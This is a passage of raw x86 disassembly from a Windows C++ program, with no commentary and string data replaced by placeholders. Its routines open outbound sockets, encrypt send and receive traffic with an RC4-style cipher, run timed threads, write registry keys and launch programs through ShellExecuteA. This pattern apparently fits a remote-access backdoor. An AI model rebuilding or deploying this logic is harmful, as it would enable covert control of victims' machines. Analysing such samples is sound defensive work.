call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_4020e1
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ esi + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
pop esi
leave
retn 0x4
mov ecx esi
call sub_402109
sub_402109
cmp [ rw-data ] 0x0
push esi
mov esi ecx
jne r-xdata
push 0x6
push 0x1
push 0x0
call socket
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
call sub_402141
and [ esi + 0x34 ] 0x0
and [ esi + 0x35 ] 0x0
mov [ esi + 0x30 ] 0x3e8
pop esi
retn
xor al al
pop esi
retn
sub_402141
push ebp
mov ebp esp
sub esp 0x190
lea eax [ ebp - 0x190 ]
push eax
push 0x202
call WSAStartup
neg eax
sbb al al
inc al
mov [ rw-data ] al
leave
retn
sub_402168
push ebp
mov ebp esp
push esi
lea eax [ ecx + 0x4 ]
push edi
lea esi [ ebp + 0x8 ]
mov edi eax
push 0x10
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
push [ ecx ]
movsd [ edi ] [ esi ]
call connect
pop edi
pop esi
test eax eax
jne r-xdata
call WSAGetLastError
xor al al
mov al 0x1
jmp r-xdata
pop ebp
retn 0x10
sub_402198
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push [ ecx ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402504
add esp 0x14
lea ecx [ ebp + 0x8 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x10
sub_4021eb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
xor eax eax
push eax
push eax
push ecx
push sub_40220a
push eax
push eax
call [ CreateThread@IAT ]
pop ebp
retn 0x4
sub_40221c
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi ecx
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
and [ esi + 0x2c ] 0x0
push ebx
call [ free@IAT ]
test edi edi
pop ecx
jg r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x34 ]
push eax
push edi
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
sub [ esi + 0x2c ] edi
cmp [ esi + 0x2c ] 0x0
jg r-xdata
push [ esi + 0x30 ]
call [ malloc@IAT ]
pop ecx
mov ebx eax
push 0x0
push [ esi + 0x30 ]
push ebx
push [ esi ]
call recv
mov edi eax
test edi edi
jle r-xdata
mov ecx esi
call sub_4022e6
test al al
je r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x14 ]
mov ecx esi
push [ ebp + 0x8 ]
push eax
call sub_4022ea
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0x1
mov ecx esi
call sub_402791
sub_4022ea
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
mov esi ecx
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor ebx ebx
mov [ esi + 0x2c ] ebx
mov [ ebp - 0x8 ] ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx rw-data
call sub_402a2a
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
lea edi [ eax + 0xf ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
cmp edi eax
ja r-xdata
lea eax [ esi + 0x30 ]
lea ecx [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4024b4
add esp 0xc
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
sub edi eax
mov [ esi + 0x2c ] edi
push r--data
push rw-data
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
jne r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x18 ]
push [ eax ]
lea eax [ ebp - 0x38 ]
push 0xf
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x48 ]
lea ecx [ ebp - 0x18 ]
push ebx
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x10 ] bl
jne r-xdata
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea eax [ ebp - 0x18 ]
lea ecx [ esi + 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push ebx
push ebx
push 0x1
push ebx
call [ CreateEventA@IAT ]
push ebx
push ebx
push esi
mov [ esi + 0x28 ] eax
push [ ebp + 0xc ]
push ebx
push ebx
call [ CreateThread@IAT ]
push 0xffffffff
push [ esi + 0x28 ]
call [ WaitForSingleObject@IAT ]
sub esp 0x10
lea eax [ ebp - 0x18 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push esi
call [ ebp + 0xc ]
add esp 0x14
jmp r-xdata
jmp r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
test eax eax
je r-xdata
push r--data
push rw-data
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
sub_4024b4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0xb
push esi
push r--data
call [ strncmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
xor al al
mov ecx [ ebp + 0xc ]
mov eax [ esi + 0xb ]
push edi
mov [ ecx ] eax
mov ecx [ ebp + 0x10 ]
lea edi [ eax + 0xf ]
mov edx [ ecx ]
lea esi [ edx + edx ]
cmp edi esi
pop edi
jbe r-xdata
mov al 0x1
jmp r-xdata
sub eax edx
mov edx 0xfde8
add eax 0xf
cmp eax edx
mov [ ecx ] eax
jbe r-xdata
pop esi
pop ebp
retn
mov [ ecx ] edx
sub_402504
push ebp
mov ebp esp
sub esp 0x24
push esi
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
push r--data
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0xb
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov [ eax ] esi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::empty@IAT ]
test al al
je r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx rw-data
call sub_402a2a
push 0x0
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push [ ebp + 0x18 ]
call send
lea ecx [ ebp - 0x24 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
push [ ebp + 0x18 ]
call send
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
pop esi
leave
retn
sub_4025ef
push ebp
mov ebp esp
push esi
push 0x6
push 0x1
push 0x0
call socket
mov esi eax
push 0x10
push rw-data
push esi
call connect
test eax eax
jne r-xdata
push esi
call closesocket
or esi 0xffffffff
push esi
lea eax [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402504
add esp 0x14
cmp [ ebp + 0x18 ] 0x0
je r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
pop esi
pop ebp
retn
sub_402646
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x34 ] bl
jne r-xdata
xor al al
cmp [ rw-data ] bl
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
push ebx
push ebx
push esi
push sub_402823
push ebx
push ebx
mov [ esi + 0x34 ] 0x1
mov [ esi + 0x38 ] edi
call [ CreateThread@IAT ]
mov al 0x1
pop edi
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x2 ]
push edi
push eax
movzx eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x30 ]
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0xb ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x18
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
pop ebx
leave
retn 0x4
sub_4026f2
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
xor al al
cmp [ rw-data ] 0x0
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
and [ esi + 0x3c ] 0x0
mov [ esi + 0x38 ] edi
mov al 0x1
pop edi
jmp r-xdata
cmp [ esi + 0x38 ] edi
je r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x2 ]
push edi
push eax
movzx eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x30 ]
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0xb ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x18
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402791
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi ecx
xor al al
cmp [ esi + 0x34 ] al
je r-xdata
xor al al
cmp [ rw-data ] al
je r-xdata
mov [ esi + 0x35 ] 0x1
mov al 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] al
jne r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x2 ]
push eax
lea ecx [ ebp - 0x30 ]
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0xb ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402832
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
jbe r-xdata
cmp [ esi + 0x35 ] bl
jne r-xdata
cmp [ esi + 0x35 ] bl
jne r-xdata
mov [ esi + 0x34 ] bl
mov [ esi + 0x35 ] bl
pop esi
xor eax eax
pop ebx
leave
retn
cmp [ rw-data ] bl
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc [ esi + 0x3c ]
mov eax [ esi + 0x3c ]
cmp eax [ esi + 0x38 ]
jb r-xdata
mov ecx esi
call sub_4021c7
lea eax [ ebp - 0x14 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x6 ]
push eax
lea ecx [ ebp - 0x34 ]
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402906
push ebp
mov ebp esp
push ebx
push esi
lea eax [ ecx + 0x400 ]
xor esi esi
push edi
mov [ ecx + 0x404 ] esi
mov [ eax ] esi
mov edi 0x100
mov edx [ eax ]
mov [ ecx + edx * 4 ] edx
inc [ eax ]
cmp [ eax ] edi
jl r-xdata
mov [ ecx + 0x400 ] esi
mov eax [ ecx + 0x400 ]
xor edx edx
mov ebx edi
lea esi [ ecx + eax * 4 ]
div [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
movzx eax [ edx + eax ]
add eax [ esi ]
add eax [ ecx + 0x404 ]
cdq
idiv ebx
mov [ ecx + 0x404 ] edx
mov al [ esi ]
mov [ ecx + 0x408 ] al
mov eax edx
mov eax [ ecx + eax * 4 ]
mov [ esi ] eax
mov edx [ ecx + 0x404 ]
movzx eax [ ecx + 0x408 ]
mov [ ecx + edx * 4 ] eax
inc [ ecx + 0x400 ]
cmp [ ecx + 0x400 ] edi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_40298e
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
mov esi ecx
mov ebx 0x100
push edi
mov ecx ebx
lea edi [ ebp - 0x40c ]
mov [ ebp - 0xc ] esi
xor eax eax
inc [ ebp + 0xc ]
[ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov edi eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
jmp r-xdata
inc eax
mov ecx ebx
cdq
idiv ecx
mov eax [ ebp + edx * 4 - 0x40c ]
mov esi ebx
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
lea ecx [ ebp + edx * 4 - 0x40c ]
cdq
idiv esi
mov esi [ ebp - 0xc ]
mov al [ ecx ]
mov [ esi + 0x408 ] al
mov [ ebp - 0x4 ] edx
lea eax [ ebp + edx * 4 - 0x40c ]
mov edx [ ebp + edx * 4 - 0x40c ]
mov [ ecx ] edx
movzx edx [ esi + 0x408 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
lea esi [ edi + eax ]
mov eax [ ecx ]
add eax edx
mov ecx ebx
cdq
idiv ecx
mov al [ ebp + edx * 4 - 0x40c ]
xor [ esi ] al
inc edi
cmp edi [ ebp + 0xc ]
jb r-xdata
mov eax [ ebp - 0x8 ]
sub_402a2a
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp + 0xf ]
push esi
push eax
mov esi ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov ecx esi
call sub_40298e
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn 0xc
sub_402a78
push ebp
mov ebp esp
sub esp 0x24
push esi
mov esi r--data
push edi
push esi
push r--data
lea eax [ ebp - 0x14 ]
push 0x80000000
push eax
call sub_408ef1
mov edi rw-data
add esp 0x10
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
inc eax
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi 0x80000001
push eax
push edi
call sub_4090d0
add esp 0x1c
lea eax [ ebp - 0x1 ]
push 0x2
sub esp 0x10
mov ecx esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push esi
push r--data
push edi
call sub_408fda
push r--data
lea eax [ ebp - 0x24 ]
push 0x34
push eax
call sub_40712f
add esp 0x2c
xor edi edi
lea ecx [ ebp - 0x24 ]
push edi
push esi
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push edi
call [ ShellExecuteA@IAT ]
cmp eax 0x20
jbe r-xdata
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
xor al al
pop esi
leave
retn
push edi
call [ exit@IAT ]
sub_402b5b
push ebp
mov ebp esp
sub esp 0x3ec
and [ ebp - 0x3ec ] 0x0
push ebx
push esi
push edi
mov ecx 0xf9
xor eax eax
lea edi [ ebp - 0x3eb ]
mov esi rw-data
[ edi ]
stosw [ edi ]
mov ecx esi
stosb [ edi ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x3ec ]
mov ebx r--data
mov edi rw-data
push eax
push ebx
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi 0x80000001
push eax
push esi
call sub_408f64
add esp 0x18
test al al
je r-xdata
xor al al
push 0x2
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
lea eax [ ebp - 0x3ec ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push r--data
push esi
call sub_408fda
add esp 0x20
mov ecx edi
mov [ ebp - 0x1 ] al
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_409132
mov al [ ebp - 0x1 ]
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_402c45
mov eax sub_40ffac
call _EH_prolog
sub esp 0x3b4
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov edi ecx
lea eax [ ebp - 0x29c ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
or [ edi ] 0xffffffff
xor esi esi
mov [ ebp - 0x4 ] esi
push 0x6
push 0x1
push esi
call socket
mov [ edi ] eax
push 0x10
push rw-data
push eax
call connect
test eax eax
jne r-xdata
push esi
push esi
call _CxxThrowException
push [ edi ]
sub esp 0x10
mov ebx esp
lea eax [ ebp + 0x38 ]
push eax
mov esi rw-data
push esi
lea eax [ ebp + 0x28 ]
push eax
push esi
push r--data
lea eax [ ebp - 0x2b4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2c4 ]
push eax
